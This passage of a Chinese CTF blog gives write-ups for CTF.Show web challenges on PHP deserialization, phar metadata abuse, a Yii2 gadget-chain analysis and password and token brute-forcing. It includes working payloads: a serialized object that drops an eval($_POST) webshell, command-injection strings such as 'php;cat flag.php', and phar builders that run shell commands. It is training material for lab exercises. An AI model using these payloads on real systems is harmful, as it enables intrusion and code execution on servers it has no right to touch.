<h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><h3 id="HTTP的请求过程"><a href="#HTTP的请求过程" class="headerlink" title="HTTP的请求过程"></a>HTTP的请求过程</h3><p>首先用 telnet 建立一个socket连接进行尝试，我们这里尝试一个最简单的请求，就拿我刚才写的payload做例子吧</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">telnet localhost <span class="number">8888</span></span><br><span class="line">Trying ::<span class="number">1</span>...</span><br><span class="line">Connected to localhost.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line"></span><br><span class="line">GET /web262.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: ctfshow.local:<span class="number">8888</span></span><br><span class="line"></span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Mon, <span class="number">09</span> Aug <span class="number">2021</span> <span class="number">15</span>:<span class="number">06</span>:<span class="number">21</span> GMT</span><br><span class="line">Server: Apache</span><br><span class="line">X-Powered-By: PHP/<span class="number">7.4</span>.<span class="number">2</span></span><br><span class="line">Content-Length: <span class="number">128</span></span><br><span class="line">Content-Type: text/html; charset=UTF-<span class="number">8</span></span><br><span class="line"></span><br><span class="line">Tzo3OiJtZ...</span><br></pre></td></tr></table></figure>

<p>可以看到，我们这里对 web262.php 进行 GET 请求只发送了两行，下面服务端就返回了完整的头部和内容。实际上，对于任何一个请求，客户端发送都必须要有这两行的要素。一，包括其请求方式、路径、http协议版本，二、请求的主机名。在没有curl而有telnet的情况下，大可以用这种方式来测试中间件服务器是否正常运作（不过一般不会有人这么干，也很少有只有telnet而没有curl的情况）</p>
<h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><ul>
<li><p>除了 SoapClient，有没有其他也能够被调用网页请求的类呢？</p>
<p>  &lt;待补充&gt;</p>
</li>
<li><p>是否存在任何反序列化的文件都可以调用 SoapClient 达到对内网其他网站的请求或攻击？</p>
<p>  理论上存在反序列化的地方都可以调用 SoapClient，前提是他能够调用一个不存在的方法。</p>
</li>
<li><p>为什么在 SoapClient 的变量中请求 getFlag 就能发起一次请求呢？</p>
<p>  答：SoapClient 在调用不存在的方法的时候，会让SoapClient直接调用__call</p>
</li>
<li><p>为什么必须要设置 uri 和 location？我不设置可以吗</p>
<p>  An array of options. If working in WSDL mode, this parameter is optional. If working in non-WSDL mode, you must set the location  and uri options, where location is the URL to request and uri is the target namespace of the SOAP service.<br>  ————————————————<br>  版权声明：本文为CSDN博主「gogiqp_jyh」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>  原文链接：<a href="https://blog.csdn.net/gogiqp_jyh/article/details/17359053">https://blog.csdn.net/gogiqp_jyh/article/details/17359053</a></p>
<p>  即工作于非WSDL模式下的时候，uri和location必须设置，uri为SOAP服务的目标命名空间，但实际上在本题并没有什么卵用，大可忽略。</p>
</li>
</ul>
<h1 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h1><p><code>本题目基于 PHP7.4.16</code></p>
<p>参考资料：<a href="https://blog.csdn.net/miuzzx/article/details/110558192">https://blog.csdn.net/miuzzx/article/details/110558192</a></p>
<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>根据上述题解中所述，</p>
<p>如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，</p>
<p>则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。</p>
<p>所以在该题中，只有unserialize()会被激活。事实上随意构造一个payload尝试一下也是如此，仅仅调用了unserialize和destruct</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%207.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%207.png"></p>
<p>同时还有一个关键，要在desturct时判断其code为0x36d（十进制为877）方可执行file_put_contents。留意一个条件，PHP在双等号时为弱类型判断。我们可以简单构造一个判断语句进行尝试</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="number">877</span> == <span class="string">&quot;877jro2i3rio235oi2toin23iotnoi&quot;</span>; <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>

<p>PHP 返回结果为 1，那就好办了，只需要将 username 设为 877.php，password设为一句话木马即可。</p>
<h2 id="做法-10"><a href="#做法-10" class="headerlink" title="做法"></a>做法</h2><p>最后的payload为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> ctfshowvip();</span><br><span class="line">    <span class="variable">$a</span>-&gt;username = <span class="string">&quot;877.php&quot;</span>;</span><br><span class="line">    <span class="variable">$a</span>-&gt;password = <span class="string">&quot;&lt;?php&quot;</span> . <span class="string">&#x27; eval($_POST[0]); ?&gt;&#x27;</span>;;</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>然后在 AntSword 中进入 /flag_is_here 获取 flag。</p>
<h1 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h1><p><code>本题目基于 PHP7.3.11</code></p>
<p>俗话说得好，最evil的才是最骚的（不是</p>
<p>留意下列条件，卧槽evil反而能利用system？我还以为是利用file_put_contents来做，但很明显这里有更方便的方法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;evilfile)&#123;</span><br><span class="line">            system(<span class="string">&#x27;rm &#x27;</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>构造fn参数为 <code>php;ls</code> 可以看到当前目录下有两个文件<code>flag.php index.php</code></p>
<p>构造fn参数为 <code>php;cat flag.php</code> 获取flag</p>
<h1 id="web276"><a href="#web276" class="headerlink" title="web276"></a>web276</h1><p><code>本题目基于 PHP7.3.11</code></p>
<p>参考资料：<a href="https://blog.csdn.net/weixin_45882317/article/details/116225803">https://blog.csdn.net/weixin_45882317/article/details/116225803</a></p>
<p>这里判断条件被<code>$this→admin</code>堵死了，看起来并没有其他途径来修改admin的值。</p>
<h2 id="知识点-10"><a href="#知识点-10" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>phar 的打包和使用<ul>
<li><a href="https://cloud.tencent.com/developer/article/1555484">https://cloud.tencent.com/developer/article/1555484</a></li>
<li><a href="https://www.iloveflag.com/2020/07/09/%E6%B5%85%E8%B0%88phar%E6%96%87%E4%BB%B6%E5%9C%A8ctf%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/">https://www.iloveflag.com/2020/07/09/浅谈phar文件在ctf中的应用/</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/385362368">https://zhuanlan.zhihu.com/p/385362368</a></li>
</ul>
</li>
</ul>
<h2 id="关键"><a href="#关键" class="headerlink" title="关键"></a>关键</h2><ul>
<li>file_put_contents 中可以输入绝对路径，unlink 中也会丢出一个绝对路径，绝对路径和绝对路径拼接会导致unlink失败。</li>
</ul>
<h2 id="做法-11"><a href="#做法-11" class="headerlink" title="做法"></a>做法</h2><p>phar其实类似于jar一样，将一大堆的php代码打包封装好直接调用。</p>
<p>首先，打包要将 phar.readonly 设置为 Off，否则会出现如下报错</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%208.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%208.png"></p>
<p>将fn设成 <code>/var/www/html/233.txt</code> ，底下报出 <code>Warning: unlink(/var/www/html//var/www/html/233.txt): No such file or directory in /var/www/html/index.php on line 49</code> ，再访问233.txt，返回200，手术很成功.jpg</p>
<p>首先尝试一下列出目录，payload如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">filter</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;;ls;&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$evilfile</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> filter();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.php&quot;</span>, <span class="string">&quot;Powered By Genshin Impact&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();    <span class="comment">//签名自动计算</span></span><br></pre></td></tr></table></figure>

<p>在自己电脑上运行一下，会生成一个 phar.phar，然后丢到postman，设置post，内容为binary，参数fn为/var/www/html/phar.phar，发送</p>
<p>然后在浏览器请求参数fn为 phar://phar.phar</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%209.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%209.png"></p>
<p>wow，成功，注意这里不能将ls改成flag.php，否则会被第二个正则规则过滤，你可以改成cat fl*，或者你直接插个一句话木马也是没什么所谓的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="keyword">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第二次拿flag的payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">filter</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;;cat fl*;&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$evilfile</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> filter();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.php&quot;</span>, <span class="string">&quot;Powered By Genshin Impact&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();    <span class="comment">//签名自动计算</span></span><br></pre></td></tr></table></figure>

<p>postman 设置</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2010.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2010.png"></p>
<p>第二次请求 /?fn=phar://phar2.phar 右键查看源代码获取 flag</p>
<h2 id="其他问题-1"><a href="#其他问题-1" class="headerlink" title="其他问题"></a>其他问题</h2><blockquote>
<p>「你们难道就一点问题都没有的吗？」       —— TARI TARI</p>
</blockquote>
<ul>
<li><p>怎么打包 phar</p>
<p>  答：根据 <a href="https://www.iloveflag.com/2020/07/09/%E6%B5%85%E8%B0%88phar%E6%96%87%E4%BB%B6%E5%9C%A8ctf%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/">https://www.iloveflag.com/2020/07/09/浅谈phar文件在ctf中的应用/</a> ，打包 phar需要经过下列代码</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    @unlink(<span class="string">&quot;test.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;test.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> Test();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.php&quot;</span>, <span class="string">&quot;&lt;?php phpinfo();&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();    <span class="comment">//签名自动计算</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>  由此又衍生处几个问题，包括但不限于</p>
<ul>
<li><p>为什么要设置 stub，他有什么作用吗？为什么要写 __HALT_COMPILER();？</p>
<p>  参考资料：<a href="https://www.webhek.com/post/packaging-your-php-apps-with-phar.html">https://www.webhek.com/post/packaging-your-php-apps-with-phar.html</a></p>
<blockquote>
<p>运行Phar文件时，stub文件被当做一个meta文件来初始化Phar， 并告诉Phar文件在被调用时该做什么。</p>
</blockquote>
<p>  打个不太恰当的比喻，可能类似于phar的入口文件吧，或者像是模板的header.php，在调用内容前可以用来执行一下前面的函数。</p>
<p>  同时，phar也必须加入__HALT_COMPILER();</p>
<blockquote>
<p>stub文件的结尾处需要调用 __HALT_COMPILER() 方法，这个方法后不能留空格。__HALT_COMPILER() 会立即终止PHP的运行，防止include的文件在此方法后仍然执行。这是Phar必须的，没有它Phar将不能正常运行</p>
</blockquote>
<p>  由此又衍生出一个问题</p>
<ul>
<li><p>可以在setStub时就插入file_put_contents插入一句话木马吗？</p>
<p>  试了一下，无论是echo “test”;还是放置1.txt，还是修改为绝对路径 /var/www/html/1.txt ，好像都不能正常插入，可能不行？</p>
<p>  &lt;待尝试&gt;</p>
</li>
</ul>
</li>
<li><p>为什么要设置添加其他压缩文件，它有什么用？不加可以吗</p>
<p>  phar本质是一个压缩文件，需要其他文件来填充。实测如果不加其他文件来压缩的话，phar文件不能被产生。</p>
</li>
<li><p>为什么要设置Metadata，为什么它能够自动反序列化</p>
<p>  参考资料：<a href="https://zhuanlan.zhihu.com/p/385362368">https://zhuanlan.zhihu.com/p/385362368</a></p>
<blockquote>
<p>manifest：压缩文件的属性等信息，其中的Meta-data会以序列化的形式存储。</p>
</blockquote>
<p>  也就是说，这个menifest存储的是压缩文件的属性信息，而又恰好这个metadata是以序列化的形式存储的，当对phar进行读取等操作的时候，就会将这个metadata给反序列化，自然可以调用到上文中的destruct。</p>
</li>
</ul>
</li>
</ul>
<h1 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h1><p><code>本题目基于 PHP7.3.11, Yii</code> 未完成</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/rfrder/article/details/113824239">https://blog.csdn.net/rfrder/article/details/113824239</a>（yii2框架 反序列化漏洞复现）</p>
<h2 id="本地环境搭建"><a href="#本地环境搭建" class="headerlink" title="本地环境搭建"></a>本地环境搭建</h2><p>在 Github <a href="https://github.com/yiisoft/yii2/releases/tag/2.0.37">https://github.com/yiisoft/yii2/releases/tag/2.0.37</a> 上下载 2.0.37 版本，解压到网站目录，并将 webroot 指向 /web ，安装 composer，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">curl -sS https:<span class="comment">//getcomposer.org/installer | php</span></span><br><span class="line">mv composer.phar /usr/local/bin/composer</span><br></pre></td></tr></table></figure>

<p>完成后运行 <code>composer run-script post-create-project-cmd</code></p>
<p>打开 yii2.local，查看是否安装成功</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2011.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2011.png"></p>
<h2 id="开搞"><a href="#开搞" class="headerlink" title="开搞"></a>开搞</h2><p>参考资料：</p>
<ul>
<li><a href="https://blog.csdn.net/rfrder/article/details/113824239">https://blog.csdn.net/rfrder/article/details/113824239</a></li>
<li><a href="https://www.cnblogs.com/potatsoSec/p/13693969.html">https://www.cnblogs.com/potatsoSec/p/13693969.html</a></li>
</ul>
<p>对于反序列链利用我还不是很懂，所以大部分都是跟着大佬和别人的wp依葫芦画瓢，此文章仅仅是为了记录我的一次实践过程，十分感谢上述这些资料的帮助。</p>
<p>根据文章，反序列化反序列化，就是要用到unserialize的。不过不用急，我们先看一下 CVE-2020-15148 修复了什么。</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2012.png" alt="Untitled"></p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2013.png" alt="Untitled"></p>
<p>从 <a href="https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99">https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99</a> 可以看出，对 framework/db/BatchQueryResult.php 增添了 __wakeup 用于禁止 BatchQueryResult 被反序列化，言外之意就是我们要利用这个来进行反序列化漏洞。</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2014.png" alt="Untitled"></p>
<p>这个漏洞的切入点为 __destruct()（到底是怎么找到的，我也不清楚，网上也没说清楚，可能是因为在这个类没有 __call 等其他 __ 开头的方法的时候，这个是最直接有效的可使用的？）</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2015.png" alt="Untitled"></p>
<p>它调用了reset()，而 reset() 又调用了 close(); ，其中此处的判断条件又仅仅是判断是否为 null。</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2016.png" alt="Untitled"></p>
<p>又因为反序列化中，其变量其实都是可控的，也就是说我们可以继续在此处放入一个任意的对象调用close()，只要它有 __call 就可以调用它了。</p>
<p>全文搜索 <em>call ，发现一个较为合适的注入点 /verdor/fzaninotto/faker/src/Faker/Generator.php（为什么这里较为合适，是因为后面 format 还调用了 call_user_func_array吗？</em>）</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2017.png" alt="Untitled"></p>
<p>为了了解到直接调用 →close(); 会发生什么，这里写一个简单的程序来展示一下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$param</span></span>) </span>&#123;</span><br><span class="line">            print_r(<span class="variable">$method</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            print_r(<span class="variable">$param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$b</span> = <span class="keyword">new</span> A();</span><br><span class="line">    <span class="variable">$b</span>-&gt;close(<span class="number">1</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>最终输出结果为 close Array ( [0] =&gt; 1 [1] =&gt; 2 )，也就是说close被当成第一个参数 method 被传进去了，而 close 中的参数被传入 param 中，为一个数组。</p>
<p>我们再回来看这里的 __call ，调用了一个 format，巧了吗不是，format中call_user_func_array能被利用，我们再看这个 getFormatter 到底执行了什么</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2018.png" alt="Untitled"></p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2019.png" alt="Untitled"></p>
<p>反序列化嘛，这么个变量我还治不了你？也就是说， call_user_func_array 的第一个参数我们是可以自行控制的。但不行啊，arguments我们控制不了啊，怎么办呢，那我们调用另一个对象的方法呗，反正$this→getFormatter($formatter)是可控的，没说这里必须要填个string吧？</p>
<p>使用正则表达式 <code>function .*\(\)\n?\ \&#123;(.\n.*)+call_user_func\(\$this</code> （这里最后的$this存粹就是为了图方便，毕竟可以直接构造对象）在PHPStorm中查找，我们可以发现有一个符合条件的。</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2020.png" alt="Untitled"></p>
<p>两个可控，香饽饽，文件在 <code>/rest/CreateAction.php</code> 下</p>
<p>到这里，反序列化链就已经结束了。流程即为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/db/BatchQueryResult.php:<span class="number">79</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>;</span><br><span class="line"><span class="number">1</span>. BatchQueryResult() -&gt; __destruct()</span><br><span class="line">											-&gt; reset()</span><br><span class="line">											-&gt; <span class="keyword">$this</span>-&gt;_dataReader-&gt;close()</span><br><span class="line"><span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> Faker();</span><br><span class="line"></span><br><span class="line">*/verdor/fzaninotto/faker/src/Faker/<span class="built_in">Generator</span>.php:<span class="number">283</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>;*</span><br><span class="line"><span class="number">2</span>. Faker() -&gt; __call() <span class="comment">// 通过 $this-&gt;_dataReader-&gt;close() 调用</span></span><br><span class="line">					 -&gt; <span class="keyword">$this</span>-&gt;format()</span><br><span class="line">					 -&gt; call_user_func_array(<span class="keyword">$this</span>-&gt;getFormatter(<span class="variable">$formatter</span>))</span><br><span class="line"><span class="keyword">$this</span>-&gt;formatters[<span class="variable">$formatter</span>(close)] = <span class="keyword">new</span> CreateAction();</span><br><span class="line"></span><br><span class="line">/vendor/yiisoft/yii2/rest/CreateAction:<span class="number">40</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>;</span><br><span class="line"><span class="number">3</span>. CreateAction() -&gt; run()</span><br><span class="line"><span class="keyword">$this</span>-&gt;checkAccess</span><br><span class="line"><span class="keyword">$this</span>-&gt;id</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>技术篇</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>【Klee-CTF】CTF.Show Web入门 爆破 web21~web28</title>
    <url>/archives/CTF-Show-Get-Started-with-the-web-blasting.html</url>
    <content><![CDATA[<h1 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h1><h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>首先先打开浏览器发送一次 HTTP 认证请求并抓包，将请求发送给 Intruder，并将此处添加为 payload</p>
<span id="more"></span>

<p><img data-src="CTF-Show-Get-Started-with-the-web-blasting/Untitled.png" alt="Untitled"></p>
<p>进入payloads标签页，将 Payload type 修改为 Custom iterator，在 Position 1 处填入 admin: ，在Position 2 处点击Add from list… 并选择 Passwords</p>
<p>然后在 Payload Processing 中加入 Base64 Encode</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-blasting/Untitled%201.png" alt="Untitled"></p>
<p>注意：要记得把 Payload Encoding 中的 URL-encode 给去除掉，否则会出现把=给编码的情况。我们可以看上面，=号是没有被编码的，编码将会导致传到服务器后无法进行base64 decode。</p>
<p>设置完毕点击 Start Attack，喝杯 Jvav</p>
<p>然后我重复扫了两次，发现扫不出来。。。。<del>然后查了一下其他同学的writeup发现密码是123456</del></p>
<p><del>然后我翻了翻burpsuite的passwords，他竟然没有123456？？？？？？？</del></p>
<p>原来是题目里面就有一个密码字典。。大意了，赶紧点开下载</p>
<p>然后在 Filter 里面隐藏400请求结果，等待200结果出现即可拿到flag</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-blasting/Untitled%202.png" alt="Untitled"></p>
<h1 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h1><h2 id="做题-1"><a href="#做题-1" class="headerlink" title="做题"></a>做题</h2><p>使用 OneForAll 扫描，命令为 <code>python3 [oneforall.py](http://oneforall.py/) --target ctf.show run</code> </p>
<p>排除上述 challenges 的结果后，最终可以在 <a href="http://vip.ctf.show/">vip.ctf.show</a> 的title中看到flag</p>
<h1 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h1><h2 id="做题-2"><a href="#做题-2" class="headerlink" title="做题"></a>做题</h2><p>没思路</p>
<p>虽然但是，我们可以将爆破转换到本地来进行，反正有代码了，节省了上下行时间，改造一下？</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 11:43:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 11:56:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//include(&#x27;flag.php&#x27;);</span></span><br><span class="line"><span class="comment">//if(isset($_GET[&#x27;token&#x27;]))&#123;</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$count</span> = <span class="number">0</span>; <span class="variable">$count</span> &lt;= <span class="number">1000</span>; <span class="variable">$count</span>++) &#123; <span class="comment">// 改造为for循环，没想到1000次就够了</span></span><br><span class="line">    <span class="variable">$token</span> = md5(<span class="variable">$count</span>);</span><br><span class="line">    <span class="keyword">if</span>(</span><br><span class="line">        substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>) === substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>)</span><br><span class="line">        &amp;&amp; substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(</span><br><span class="line">            (</span><br><span class="line">                intval(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))</span><br><span class="line">                + intval(substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))</span><br><span class="line">                + substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>)</span><br><span class="line">            ) / substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>) === intval(substr(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>))</span><br><span class="line">        )&#123;</span><br><span class="line"><span class="comment">//            echo $flag;</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$count</span> . <span class="string">&quot; &quot;</span>; <span class="comment">// 输出结果</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//else&#123;</span></span><br><span class="line"><span class="comment">//    highlight_file(__FILE__);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>光看条件肯定是做不出的，最后跑一遍php就可以出了，肯定有很多答案，1000以内存在一个422的答案能拿到flag。</p>
